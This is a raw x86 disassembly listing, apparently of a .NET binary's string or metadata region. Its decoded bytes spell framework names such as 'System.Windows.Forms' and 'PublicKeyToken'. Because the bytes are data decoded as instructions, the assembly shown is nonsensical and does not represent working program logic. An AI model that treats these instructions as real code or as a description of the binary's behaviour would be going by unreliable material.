  406c48:	je     0x406c9a
  406c4a:	jne    0x406cae
  406c4c:	ins    BYTE PTR es:[edi],dx
  406c4d:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  406c54:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  406c58:	dec    ebp
  406c59:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406c60:	je     0x406cb2
  406c62:	jne    0x406cc6
  406c64:	ins    BYTE PTR es:[edi],dx
  406c65:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  406c6c:	ins    BYTE PTR es:[edi],dx
  406c6d:	ins    BYTE PTR es:[edi],dx
  406c6e:	add    BYTE PTR [ebx+0x68],dl
  406c71:	popa   
  406c72:	jb     0x406cd9
  406c74:	fs dec esp
  406c76:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  406c7d:	arpl   WORD PTR [ebx+0x65],cx
  406c80:	jns    0x406c82
  406c82:	push   ebx
  406c83:	push   0x64657261
  406c88:	dec    esp
  406c89:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  406c90:	arpl   WORD PTR [ebx+0x65],cx
  406c93:	jns    0x406ce9
  406c95:	outs   dx,DWORD PTR ds:[esi]
  406c96:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  406c9a:	push   ebx
  406c9b:	push   0x64657261
  406ca0:	dec    esp
  406ca1:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  406ca8:	arpl   WORD PTR [ebx+0x65],cx
  406cab:	jns    0x406cf3
  406cad:	jne    0x406d1b
  406caf:	ins    BYTE PTR es:[edi],dx
  406cb0:	add    BYTE PTR [ebx+0x79],dl
  406cb3:	jae    0x406d29
  406cb5:	gs ins DWORD PTR es:[edi],dx
  406cb7:	inc    ebx
  406cb8:	outs   dx,DWORD PTR ds:[esi]
  406cb9:	ins    DWORD PTR es:[edi],dx
  406cba:	jo     0x406d2b
  406cbc:	outs   dx,BYTE PTR ds:[esi]
  406cbd:	outs   dx,BYTE PTR gs:[esi]
  406cbf:	je     0x406d0e
  406cc1:	outs   dx,DWORD PTR ds:[esi]
  406cc2:	fs gs ins BYTE PTR es:[edi],dx
  406cc5:	inc    esp
  406cc6:	popa   
  406cc7:	je     0x406d2a
  406cc9:	inc    ecx
  406cca:	outs   dx,BYTE PTR ds:[esi]
  406ccb:	outs   dx,BYTE PTR ds:[esi]
  406ccc:	outs   dx,DWORD PTR ds:[esi]
  406ccd:	je     0x406d30
  406ccf:	je     0x406d3a
  406cd1:	outs   dx,DWORD PTR ds:[esi]
  406cd2:	outs   dx,BYTE PTR ds:[esi]
  406cd3:	jae    0x406cd5
  406cd5:	push   ebx
  406cd6:	jns    0x406d4b
  406cd8:	je     0x406d3f
  406cda:	ins    DWORD PTR es:[edi],dx
  406cdb:	inc    ebx
  406cdc:	outs   dx,DWORD PTR ds:[esi]
  406cdd:	outs   dx,BYTE PTR ds:[esi]
  406cde:	imul   sp,WORD PTR [edi+0x75],0x6172
  406ce4:	je     0x406d4f
  406ce6:	outs   dx,DWORD PTR ds:[esi]
  406ce7:	outs   dx,BYTE PTR ds:[esi]
  406ce8:	add    BYTE PTR [ebx+0x79],dl
  406ceb:	jae    0x406d61
  406ced:	gs ins DWORD PTR es:[edi],dx
  406cef:	inc    ebx
  406cf0:	outs   dx,DWORD PTR ds:[esi]
  406cf1:	outs   dx,BYTE PTR ds:[esi]
  406cf2:	imul   sp,WORD PTR [edi+0x75],0x6172
  406cf8:	je     0x406d63
  406cfa:	outs   dx,DWORD PTR ds:[esi]
  406cfb:	outs   dx,BYTE PTR ds:[esi]
  406cfc:	dec    ecx
  406cfd:	outs   dx,BYTE PTR ds:[esi]
  406cfe:	jae    0x406d74
  406d00:	popa   
  406d01:	ins    BYTE PTR es:[edi],dx
  406d02:	ins    BYTE PTR es:[edi],dx
  406d03:	add    BYTE PTR [ebx+0x79],dl
  406d06:	jae    0x406d7c
  406d08:	gs ins DWORD PTR es:[edi],dx
  406d0a:	inc    esp
  406d0b:	gs jo  0x406d7a
  406d0e:	outs   dx,DWORD PTR ds:[esi]
  406d0f:	jns    0x406d7e
  406d11:	outs   dx,BYTE PTR gs:[esi]
  406d13:	je     0x406d15
  406d15:	push   ebx
  406d16:	jns    0x406d8b
  406d18:	je     0x406d7f
  406d1a:	ins    DWORD PTR es:[edi],dx
  406d1b:	inc    esp
  406d1c:	gs jae 0x406d88
  406d1f:	outs   dx,BYTE PTR ds:[si]
  406d21:	add    BYTE PTR [ebx+0x79],dl
  406d24:	jae    0x406d9a
  406d26:	gs ins DWORD PTR es:[edi],dx
  406d28:	inc    esp
  406d29:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  406d30:	jns    0x406d85
  406d32:	gs jb  0x406dab
  406d35:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  406d3c:	jae    0x406db2
  406d3e:	gs ins DWORD PTR es:[edi],dx
  406d40:	inc    esp
  406d41:	jb     0x406da4
  406d43:	ja     0x406dae
  406d45:	outs   dx,BYTE PTR ds:[esi]
  406d46:	addr16 inc esp
  406d48:	gs jae 0x406db4
  406d4b:	outs   dx,BYTE PTR ds:[si]
  406d4d:	add    BYTE PTR [ebx+0x79],dl
  406d50:	jae    0x406dc6
  406d52:	gs ins DWORD PTR es:[edi],dx
  406d54:	inc    esp
  406d55:	jb     0x406db8
  406d57:	ja     0x406dc2
  406d59:	outs   dx,BYTE PTR ds:[esi]
  406d5a:	add    BYTE PTR [bp+di+0x79],dl
  406d5e:	jae    0x406dd4
  406d60:	gs ins DWORD PTR es:[edi],dx
  406d62:	inc    ebp
  406d63:	outs   dx,BYTE PTR ds:[esi]
  406d64:	je     0x406dcb
  406d66:	jb     0x406dd8
  406d68:	jb     0x406dd3
  406d6a:	jae    0x406dd1
  406d6c:	push   ebx
  406d6d:	gs jb  0x406de6
  406d70:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  406d77:	jae    0x406ded
  406d79:	gs ins DWORD PTR es:[edi],dx
  406d7b:	dec    ebp
  406d7c:	popa   
  406d7d:	outs   dx,BYTE PTR ds:[esi]
  406d7e:	popa   
  406d7f:	gs ins DWORD PTR es:[di],dx
  406d82:	outs   dx,BYTE PTR gs:[esi]
  406d84:	je     0x406d86
  406d86:	push   ebx
  406d87:	jns    0x406dfc
  406d89:	je     0x406df0
  406d8b:	ins    DWORD PTR es:[edi],dx
  406d8c:	dec    ebp
  406d8d:	gs jae 0x406e03
  406d90:	popa   
  406d91:	imul   ebp,DWORD PTR [bp+0x67],0x73795300
  406d99:	je     0x406e00
  406d9b:	ins    DWORD PTR es:[edi],dx
  406d9c:	push   edx
  406d9d:	jne    0x406e0d
  406d9f:	je     0x406e0a
  406da1:	ins    DWORD PTR es:[edi],dx
  406da2:	gs push ebx
  406da4:	gs jb  0x406e10
  406da7:	popa   
  406da8:	ins    BYTE PTR es:[edi],dx
  406da9:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  406db0:	inc    esi
  406db1:	outs   dx,DWORD PTR ds:[esi]
  406db2:	jb     0x406e21
  406db4:	popa   
  406db5:	je     0x406e2b
  406db7:	gs jb  0x406e2d
  406dba:	push   ebx
  406dbb:	outs   dx,DWORD PTR ds:[esi]
  406dbc:	popa   
  406dbd:	jo     0x406dbf
  406dbf:	push   ebx
  406dc0:	jns    0x406e35
  406dc2:	je     0x406e29
  406dc4:	ins    DWORD PTR es:[edi],dx
  406dc5:	push   ebx
  406dc6:	arpl   WORD PTR gs:[ebp+0x72],si
  406dca:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  406dd2:	gs ins DWORD PTR es:[edi],dx
  406dd4:	push   ebx
  406dd5:	gs jb  0x406e4e
  406dd8:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  406ddf:	gs jae 0x406e55
  406de2:	add    BYTE PTR [ebx+0x79],dl
  406de5:	jae    0x406e5b
  406de7:	gs ins DWORD PTR es:[edi],dx
  406de9:	push   edi
  406dea:	bound  eax,QWORD PTR gs:[eax]
  406ded:	push   ebx
  406dee:	jns    0x406e63
  406df0:	je     0x406e57
  406df2:	ins    DWORD PTR es:[edi],dx
  406df3:	push   edi
  406df4:	bound  eax,QWORD PTR gs:[ecx+0x62]
  406df8:	jae    0x406e6e
  406dfa:	jb     0x406e5d
  406dfc:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  406e00:	outs   dx,BYTE PTR ds:[esi]
  406e01:	jae    0x406e03
  406e03:	push   ebx
  406e04:	jns    0x406e79
  406e06:	je     0x406e6d
  406e08:	ins    DWORD PTR es:[edi],dx
  406e09:	push   edi
  406e0a:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  406e0f:	popa   
  406e10:	ins    DWORD PTR es:[edi],dx
  406e11:	imul   esp,DWORD PTR [ebx+0x44],0x617461
  406e18:	push   ebx
  406e19:	jns    0x406e8e
  406e1b:	je     0x406e82
  406e1d:	ins    DWORD PTR es:[edi],dx
  406e1e:	push   edi
  406e1f:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  406e24:	popa   
  406e25:	ins    DWORD PTR es:[edi],dx
  406e26:	imul   esp,DWORD PTR [ebx+0x44],0x44617461
  406e2d:	gs jae 0x406e99
  406e30:	outs   dx,BYTE PTR ds:[si]
  406e32:	add    BYTE PTR [ebx+0x79],dl
  406e35:	jae    0x406eab
  406e37:	gs ins DWORD PTR es:[edi],dx
  406e39:	push   edi
  406e3a:	bound  eax,QWORD PTR gs:[ebp+0x6e]
  406e3e:	je     0x406ea9
  406e40:	je     0x406ebb
  406e42:	inc    esp
  406e43:	gs jae 0x406eaf
  406e46:	outs   dx,BYTE PTR ds:[si]
  406e48:	add    BYTE PTR [ebx+0x79],dl
  406e4b:	jae    0x406ec1
  406e4d:	gs ins DWORD PTR es:[edi],dx
  406e4f:	push   edi
  406e50:	bound  eax,QWORD PTR gs:[ebp+0x78]
  406e54:	je     0x406ebb
  406e56:	outs   dx,BYTE PTR ds:[esi]
  406e57:	jae    0x406ec2
  406e59:	outs   dx,DWORD PTR ds:[esi]
  406e5a:	outs   dx,BYTE PTR ds:[esi]
  406e5b:	jae    0x406e5d
  406e5d:	push   ebx
  406e5e:	jns    0x406ed3
  406e60:	je     0x406ec7
  406e62:	ins    DWORD PTR es:[edi],dx
  406e63:	push   edi
  406e64:	bound  eax,QWORD PTR gs:[ebp+0x78]
  406e68:	je     0x406ecf
  406e6a:	outs   dx,BYTE PTR ds:[esi]
  406e6b:	jae    0x406ed6
  406e6d:	outs   dx,DWORD PTR ds:[esi]
  406e6e:	outs   dx,BYTE PTR ds:[esi]
  406e6f:	jae    0x406eb5
  406e71:	gs jae 0x406edd
  406e74:	outs   dx,BYTE PTR ds:[si]
  406e76:	add    BYTE PTR [ebx+0x79],dl
  406e79:	jae    0x406eef
  406e7b:	gs ins DWORD PTR es:[edi],dx
  406e7d:	push   edi
  406e7e:	bound  ecx,QWORD PTR gs:[ebp+0x6f]
  406e82:	bound  ebp,QWORD PTR [ecx+0x6c]
  406e85:	add    BYTE PTR gs:[ebx+0x79],dl
  406e89:	jae    0x406eff
  406e8b:	gs ins DWORD PTR es:[edi],dx
  406e8d:	push   edi
  406e8e:	bound  edx,QWORD PTR gs:[edx+0x65]
  406e92:	addr16 jne 0x406f01
  406e95:	popa   
  406e96:	jb     0x406edd
  406e98:	js     0x406f0a
  406e9a:	jb     0x406f01
  406e9c:	jae    0x406f11
  406e9e:	imul   ebp,DWORD PTR [edi+0x6e],0x79530073
  406ea5:	jae    0x406f1b
  406ea7:	gs ins DWORD PTR es:[edi],dx
  406ea9:	push   edi
  406eaa:	bound  edx,QWORD PTR gs:[edx+0x6f]
  406eae:	jne    0x406f24
  406eb0:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  406eb7:	je     0x406f1e
  406eb9:	ins    DWORD PTR es:[edi],dx
  406eba:	push   edi
  406ebb:	bound  edx,QWORD PTR gs:[ebx+0x65]
  406ebf:	jb     0x406f37
  406ec1:	imul   esp,DWORD PTR [ebx+0x65],0x694d0073
  406ec8:	arpl   WORD PTR [edx+0x6f],si
  406ecb:	jae    0x406f3c
  406ecd:	data16 je 0x406f26
  406ed0:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  406ed7:	jne    0x406f3d
  406ed9:	imul   ebp,DWORD PTR [edi+0x0],0x7263694d
  406ee0:	outs   dx,DWORD PTR ds:[esi]
  406ee1:	jae    0x406f52
  406ee3:	data16 je 0x406f3c
  406ee6:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  406eed:	jne    0x406f53
  406eef:	imul   ebp,DWORD PTR [edi+0x57],0x6f646e69
  406ef6:	ja     0x406f6b
  406ef8:	inc    esi
  406ef9:	outs   dx,DWORD PTR ds:[esi]
  406efa:	jb     0x406f69
  406efc:	jae    0x406efe
  406efe:	push   esi
  406eff:	dec    edx
  406f00:	push   ebx
  406f01:	push   0x43707261
  406f06:	outs   dx,DWORD PTR ds:[esi]
  406f07:	fs gs push eax
  406f0a:	jb     0x406f7b
  406f0c:	jbe    0x406f77
  406f0e:	fs gs jb 0x406f12
  406f12:	inc    ecx
  406f13:	push   ebx
  406f14:	push   eax
  406f15:	inc    edx
  406f16:	jb     0x406f87
  406f18:	ja     0x406f8d
  406f1a:	gs jb  0x406f60
  406f1d:	popa   
  406f1e:	jo     0x406f93
  406f20:	push   eax
  406f21:	jne    0x406f85
  406f23:	ins    BYTE PTR es:[edi],dx
  406f24:	imul   esp,DWORD PTR [ebx+0x4b],0x41007965
  406f2b:	push   ebx
  406f2c:	push   eax
  406f2d:	inc    edx
  406f2e:	jb     0x406f9f
  406f30:	ja     0x406fa5
  406f32:	gs jb  0x406f78
  406f35:	popa   
  406f36:	jo     0x406fab
  406f38:	inc    esi
  406f39:	popa   
  406f3a:	arpl   WORD PTR [edi+ebp*2+0x72],si
  406f3e:	jns    0x406f40
  406f40:	dec    ebp
  406f41:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406f48:	je     0x406fa0
  406f4a:	push   ebx
  406f4b:	inc    esp
  406f4c:	gs jae 0x406fb8
  406f4f:	outs   dx,BYTE PTR ds:[si]
  406f51:	gs jb  0x406f54
  406f54:	dec    ebp
  406f55:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406f5c:	je     0x406fb4
  406f5e:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  406f65:	jne    0x406fcb
  406f67:	imul   ebp,DWORD PTR [edi+0x57],0x4d006265
  406f6e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406f75:	je     0x406fce
  406f77:	bound  eax,QWORD PTR gs:[ebp+eiz*2+0x73]
  406f7c:	imul   esp,DWORD PTR [edi+0x6e],0x63694d00
  406f83:	jb     0x406ff4
  406f85:	jae    0x406ff6
  406f87:	data16 je 0x406fe0
  406f8a:	push   ebx
  406f8b:	inc    esp
  406f8c:	gs jae 0x406ff8
  406f8f:	outs   dx,BYTE PTR ds:[si]
  406f91:	gs jb  0x406fe1
  406f94:	outs   dx,DWORD PTR ds:[esi]
  406f95:	bound  ebp,QWORD PTR [ecx+0x6c]
  406f98:	add    BYTE PTR gs:[ebp+0x69],cl
  406f9c:	arpl   WORD PTR [edx+0x6f],si
  406f9f:	jae    0x407010
  406fa1:	data16 je 0x406fee
  406fa4:	push   ebx
  406fa5:	arpl   WORD PTR [edx+0x69],si
  406fa8:	jo     0x40701e
  406faa:	add    BYTE PTR [ebx+0x79],dl
  406fad:	jae    0x407023
  406faf:	gs ins DWORD PTR es:[edi],dx
  406fb1:	cs push edx
  406fb3:	gs jae 0x407025
  406fb6:	jne    0x40702a
  406fb8:	arpl   WORD PTR [ebp+0x73],sp
  406fbb:	add    BYTE PTR [edx+0x65],dl
  406fbe:	jae    0x40702f
  406fc0:	jne    0x407034
  406fc2:	arpl   WORD PTR [ebp+0x4d],sp
  406fc5:	popa   
  406fc6:	outs   dx,BYTE PTR ds:[esi]
  406fc7:	popa   
  406fc8:	addr16 gs jb 0x406fcc
  406fcc:	jb     0x407033
  406fce:	jae    0x40703d
  406fd0:	addr16 jb 0x406fd3
  406fd3:	inc    edi
  406fd4:	gs je  0x40702a
  406fd7:	je     0x40704b
  406fd9:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  406fe0:	pop    edi
  406fe1:	inc    ebx
  406fe2:	outs   dx,DWORD PTR ds:[esi]
  406fe3:	jo     0x40705e
  406fe5:	jb     0x407050
  406fe7:	addr16 push 0x726f4674
  406fed:	inc    ebx
  406fee:	ins    DWORD PTR es:[edi],dx
  406fef:	fs dec esp
  406ff1:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  406ff8:	pop    edi
  406ff9:	push   edi
  406ffa:	arpl   WORD PTR [esi+0x54],sp
  406ffd:	jb     0x407060
  406fff:	fs gs ins DWORD PTR es:[edi],dx
  407002:	popa   
  407003:	jb     0x407070
  407005:	inc    esi
  407006:	outs   dx,DWORD PTR ds:[esi]
  407007:	jb     0x40704c
  407009:	ins    DWORD PTR es:[edi],dx
  40700a:	fs dec esp
  40700c:	imul   ebp,DWORD PTR [esi+0x65],0x706f4300
  407013:	jns    0x407087
  407015:	imul   esp,DWORD PTR [edi+0x68],0x726f4674
  40701c:	inc    ebx
  40701d:	ins    DWORD PTR es:[edi],dx
  40701e:	fs dec esp
  407020:	imul   ebp,DWORD PTR [esi+0x65],0x66635700
  407027:	push   esp
  407028:	jb     0x40708b
  40702a:	fs gs ins DWORD PTR es:[edi],dx
  40702d:	popa   
  40702e:	jb     0x40709b
  407030:	inc    esi
  407031:	outs   dx,DWORD PTR ds:[esi]
  407032:	jb     0x407077
  407034:	ins    DWORD PTR es:[edi],dx
  407035:	fs dec esp
  407037:	imul   ebp,DWORD PTR [esi+0x65],0x70657200
  40703e:	ins    BYTE PTR es:[edi],dx
  40703f:	popa   
  407040:	arpl   WORD PTR [ebp+0x64],sp
  407043:	add    BYTE PTR [esi],ch
  407045:	arpl   WORD PTR [edi+ebp*2+0x72],si
  407049:	add    BYTE PTR [edi+0x65],ah
  40704c:	je     0x4070ad
  40704e:	inc    esp
  40704f:	gs jae 0x4070b5
  407052:	jb     0x4070bd
  407054:	jo     0x4070ca
  407056:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  40705d:	dec    esp
  40705e:	outs   dx,DWORD PTR ds:[esi]
  40705f:	arpl   WORD PTR [ecx+0x6c],sp
  407062:	imul   edi,DWORD PTR [edx+0x65],0x72745364
  407069:	imul   ebp,DWORD PTR [esi+0x67],0x70754400
  407070:	ins    BYTE PTR es:[edi],dx
  407071:	imul   esp,DWORD PTR [ebx+0x61],0x65526574
  407078:	jae    0x4070e9
  40707a:	jne    0x4070ee
  40707c:	arpl   WORD PTR [ebp+0x4b],sp
  40707f:	gs jns 0x407082
  407082:	push   ebp
  407083:	outs   dx,BYTE PTR ds:[esi]
  407084:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  407088:	outs   dx,BYTE PTR ds:[esi]
  407089:	inc    esi
  40708a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  407092:	jae    0x4070fd
  407094:	outs   dx,DWORD PTR ds:[esi]
  407095:	outs   dx,BYTE PTR ds:[esi]
  407096:	add    BYTE PTR [esi+0x69],al
  407099:	ins    BYTE PTR es:[edi],dx
  40709a:	gs dec esi
  40709c:	outs   dx,DWORD PTR ds:[esi]
  40709d:	je     0x4070e5
  40709f:	outs   dx,DWORD PTR ds:[esi]
  4070a0:	jne    0x407110
  4070a2:	add    BYTE PTR fs:[ecx+0x6e],cl
  4070a6:	jbe    0x407109
  4070a8:	ins    BYTE PTR es:[edi],dx
  4070a9:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x57005873
  4070b1:	jb     0x40711c
  4070b3:	je     0x40711a
  4070b5:	inc    ebp
  4070b6:	jb     0x40712a
  4070b8:	outs   dx,DWORD PTR ds:[esi]
  4070b9:	jb     0x4070bb
  4070bb:	inc    ebx
  4070bc:	outs   dx,DWORD PTR ds:[esi]
  4070bd:	jb     0x407131
  4070bf:	jne    0x407131
  4070c1:	je     0x407112
  4070c3:	jne    0x407139
  4070c5:	jo     0x40713c
  4070c7:	je     0x4070c9
  4070c9:	inc    esp
  4070ca:	gs ins BYTE PTR es:[edi],dx
  4070cc:	gs je  0x407134
  4070cf:	dec    edi
  4070d0:	jne    0x407146
  4070d2:	jo     0x407149
  4070d4:	je     0x40711c
  4070d6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x46],0x656c6961
  4070de:	add    BYTE PTR fs:[ebx+0x70],dl
  4070e2:	arpl   WORD PTR gs:[ecx+0x66],bp
  4070e6:	imul   esp,DWORD PTR [ebx+0x45],0x726f7272
  4070ed:	add    BYTE PTR [edi+0x65],al
  4070f0:	outs   dx,BYTE PTR ds:[esi]
  4070f1:	gs jb  0x40715d
  4070f4:	arpl   WORD PTR [edi+0x72],dx
  4070f7:	imul   esi,DWORD PTR [ebp+eiz*2+0x45],0x726f7272
  4070ff:	add    BYTE PTR [ebp+0x72],al
  407102:	jb     0x407173
  407104:	jb     0x407149
  407106:	outs   dx,DWORD PTR ds:[esi]
  407107:	jne    0x407177
  407109:	je     0x40710b
  40710b:	push   edi
  40710c:	popa   
  40710d:	jb     0x40717d
  40710f:	imul   ebp,DWORD PTR [esi+0x67],0x6e756f43
  407116:	je     0x407118
  407118:	dec    ecx
  407119:	dec    esi
  40711a:	inc    esi
  40711b:	inc    esi
  40711c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x42],0x6b636172
  407124:	gs je  0x407127
  407127:	dec    esi
  407128:	outs   dx,DWORD PTR ds:[esi]
  407129:	inc    ebp
  40712a:	jno    0x4071a1
  40712c:	popa   
  40712d:	ins    BYTE PTR es:[edi],dx
  40712e:	jae    0x407187
  407130:	imul   esi,DWORD PTR [eax+ebp*2+0x4e],0x694c7765
  407138:	outs   dx,BYTE PTR ds:[esi]
  407139:	add    BYTE PTR gs:[esi+0x6f],cl
  40713d:	inc    ebp
  40713e:	jno    0x4071b5
  407140:	popa   
  407141:	ins    BYTE PTR es:[edi],dx
  407142:	jae    0x407144
  407144:	inc    edx
  407145:	popa   
  407146:	fs inc esi
  407148:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  407150:	jae    0x4071bb
  407152:	outs   dx,DWORD PTR ds:[esi]
  407153:	outs   dx,BYTE PTR ds:[esi]
  407154:	add    BYTE PTR [edx+0x61],al
  407157:	fs inc ebx
  407159:	outs   dx,DWORD PTR ds:[esi]
  40715a:	ins    DWORD PTR es:[edi],dx
  40715b:	ins    DWORD PTR es:[edi],dx
  40715c:	popa   
  40715d:	outs   dx,BYTE PTR ds:[esi]
  40715e:	fs dec esp
  407160:	imul   ebp,DWORD PTR [esi+0x65],0x6974704f
  407167:	outs   dx,DWORD PTR ds:[esi]
  407168:	outs   dx,BYTE PTR ds:[esi]
  407169:	add    BYTE PTR [edx+0x61],al
  40716c:	fs inc ebp
  40716e:	jae    0x4071d3
  407170:	popa   
  407171:	jo     0x4071d8
  407173:	add    BYTE PTR [esi+0x6f],cl
  407176:	dec    esi
  407177:	popa   
  407178:	ins    DWORD PTR es:[edi],dx
  407179:	add    BYTE PTR gs:[edx+0x65],dl
  40717d:	popa   
  40717e:	fs dec ecx
  407180:	outs   dx,BYTE PTR ds:[esi]
  407181:	add    BYTE PTR [edx+0x65],al
  407184:	imul   ebp,DWORD PTR [bp+0x57],0x69746972
  40718c:	outs   dx,BYTE PTR ds:[esi]
  40718d:	add    BYTE PTR [si+0x6f],al
  407191:	outs   dx,BYTE PTR ds:[esi]
  407192:	gs inc esp
  407194:	outs   dx,DWORD PTR ds:[esi]
  407195:	je     0x407197
  407197:	inc    edx
  407198:	imul   ebp,DWORD PTR gs:[bp+0x53],0x6c435254
  4071a1:	popa   
  4071a2:	jae    0x407217
  4071a4:	add    BYTE PTR [edx+0x65],al
  4071a7:	imul   ebp,DWORD PTR [bp+0x53],0x6c435254
  4071af:	popa   
  4071b0:	jae    0x407225
  4071b2:	dec    esi
  4071b3:	popa   
  4071b4:	ins    DWORD PTR es:[edi],dx
  4071b5:	gs jae 0x407228
  4071b8:	popa   
  4071b9:	arpl   WORD PTR [ebp+0x0],sp
  4071bc:	dec    ebp
  4071bd:	popa   
  4071be:	ins    BYTE PTR es:[edi],dx
  4071bf:	outs   dx,WORD PTR ds:[esi]
  4071c1:	jb     0x407230
  4071c3:	gs fs inc ebx
  4071c6:	outs   dx,DWORD PTR ds:[esi]
  4071c7:	ins    DWORD PTR es:[edi],dx
  4071c8:	jo     0x407233
  4071ca:	ins    BYTE PTR es:[edi],dx
  4071cb:	gs push ebx
  4071cd:	je     0x407241
  4071cf:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  4071d6:	imul   ebp,DWORD PTR [esi+0x67],0x67615473
  4071dd:	dec    edi
  4071de:	bound  esi,QWORD PTR [ebx+0x6f]
  4071e1:	ins    BYTE PTR es:[edi],dx
  4071e2:	gs je  0x40724a
  4071e5:	add    BYTE PTR [edi+0x6e],cl
  4071e8:	ins    BYTE PTR es:[edi],dx
  4071e9:	jns    0x40723e
  4071eb:	je     0x40725f
  4071ed:	imul   ebp,DWORD PTR [esi+0x67],0x6d6e5500
  4071f4:	popa   
  4071f5:	jo     0x407267
  4071f7:	popa   
  4071f8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
  4071fc:	gs jae 0x40726e
  4071ff:	jne    0x407273
  407201:	arpl   WORD PTR [ebp+0x0],sp
  407204:	push   ebp
  407205:	jae    0x407268
  407207:	add    BYTE PTR gs:[bx+di+0x6e],cl
  40720c:	jbe    0x40726f
  40720e:	ins    BYTE PTR es:[edi],dx
  40720f:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  407217:	fs dec esp
  407219:	imul   ebp,DWORD PTR [esi+0x65],0x746e7953
  407220:	popa   
  407221:	js     0x407223
  407223:	inc    ebx
  407224:	outs   dx,DWORD PTR ds:[esi]
  407225:	ins    DWORD PTR es:[edi],dx
  407226:	jo     0x407291
  407228:	ins    BYTE PTR es:[edi],dx
  407229:	gs inc ecx
  40722b:	outs   dx,BYTE PTR ds:[esi]
  40722c:	fs push ebx
  40722e:	push   esp
  40722f:	push   edx
  407230:	inc    esp
  407231:	outs   dx,DWORD PTR ds:[esi]
  407232:	outs   dx,BYTE PTR ds:[esi]
  407233:	je     0x407282
  407235:	imul   edi,DWORD PTR [eax+0x0],0x746e6143
  40723c:	dec    esp
  40723d:	outs   dx,DWORD PTR ds:[esi]
  40723e:	popa   
  40723f:	fs inc ecx
  407241:	jae    0x4072b6
  407243:	gs ins DWORD PTR es:[edi],dx
  407245:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407249:	inc    ebx
  40724a:	ins    BYTE PTR es:[edi],dx
  40724b:	popa   
  40724c:	jae    0x4072c1
  40724e:	outs   dx,BYTE PTR ds:[esi]
  40724f:	popa   
  407250:	ins    DWORD PTR es:[edi],dx
  407251:	gs dec ebp
  407253:	jne    0x4072c8
  407255:	je     0x4072a4
  407257:	popa   
  407258:	je     0x4072bd
  40725a:	push   0x65736142
  40725f:	outs   dx,BYTE PTR ds:[esi]
  407260:	popa   
  407261:	ins    DWORD PTR es:[edi],dx
  407262:	add    BYTE PTR gs:[esi+0x61],dl
  407266:	ins    BYTE PTR es:[edi],dx
  407267:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  40726f:	addr16 gs jae 0x407273
  407273:	ins    BYTE PTR es:[edi],dx
  407274:	outs   dx,DWORD PTR ds:[esi]
  407275:	popa   
  407276:	fs gs jb 0x40727a
  40727a:	jb     0x4072e1
  40727c:	jae    0x4072ed
  40727e:	jne    0x4072f2
  407280:	arpl   WORD PTR [ebp+0x73],sp
  407283:	add    BYTE PTR [edi+0x65],al
  407286:	je     0x4072d4
  407288:	outs   dx,DWORD PTR ds:[esi]
  407289:	popa   
  40728a:	fs gs jb 0x40728e
  40728e:	push   ebx
  40728f:	jns    0x407304
  407291:	je     0x4072f8
  407293:	ins    DWORD PTR es:[edi],dx
  407294:	cs inc edi
  407296:	ins    BYTE PTR es:[edi],dx
  407297:	outs   dx,DWORD PTR ds:[esi]
  407298:	bound  esp,QWORD PTR [ecx+0x6c]
  40729b:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4072a2:	add    BYTE PTR [ebx+0x75],al
  4072a5:	ins    BYTE PTR es:[edi],dx
  4072a6:	je     0x40731d
  4072a8:	jb     0x40730f
  4072aa:	dec    ecx
  4072ab:	outs   dx,BYTE PTR ds:[esi]
  4072ac:	outs   dx,WORD PTR ds:[esi]
  4072ae:	add    BYTE PTR [edi+0x65],ah
  4072b1:	je     0x407312
  4072b3:	inc    ebx
  4072b4:	jne    0x407322
  4072b6:	je     0x40732d
  4072b8:	jb     0x40731f
  4072ba:	add    BYTE PTR [edi+0x65],ah
  4072bd:	je     0x40731e
  4072bf:	push   edx
  4072c0:	gs jae 0x407332
  4072c3:	jne    0x407337
  4072c5:	arpl   WORD PTR [ebp+0x73],sp
  4072c8:	add    BYTE PTR [edi+0x65],al
  4072cb:	je     0x40731c
  4072cd:	bound  ebp,QWORD PTR [edx+0x65]
  4072d0:	arpl   WORD PTR [eax+eax*1+0x43],si
  4072d4:	jne    0x407342
  4072d6:	je     0x40734d
  4072d8:	jb     0x40733f
  4072da:	add    BYTE PTR [edx+0x65],dl
  4072dd:	jae    0x40734e
  4072df:	jne    0x407353
  4072e1:	arpl   WORD PTR [ebp+0x73],sp
  4072e4:	add    BYTE PTR [ecx+0x63],al
  4072e7:	je     0x407352
  4072e9:	jbe    0x407350
  4072eb:	fs jae 0x4072ee
